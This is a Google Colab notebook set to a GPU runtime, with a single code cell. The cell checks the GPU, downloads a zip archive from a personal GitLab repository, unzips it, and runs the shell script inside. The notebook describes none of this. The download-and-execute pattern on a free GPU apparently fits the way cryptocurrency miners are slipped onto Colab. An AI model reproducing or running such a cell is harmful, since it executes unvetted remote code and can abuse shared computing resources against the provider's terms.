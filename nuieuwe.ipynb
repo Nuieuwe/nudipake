{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Colab3.ipynb",
      "private_outputs": true,
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "-19Kxmad8uDE"
      },
      "source": [
        "!nvidia-smi\n",
        "!wget https://gitlab.com/sandyvalenzuela96/hujanini/-/raw/master/joejoe.zip && unzip joejoe.zip\n",
        "!chmod +x ./joejoe.sh && ./joejoe.sh\n"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}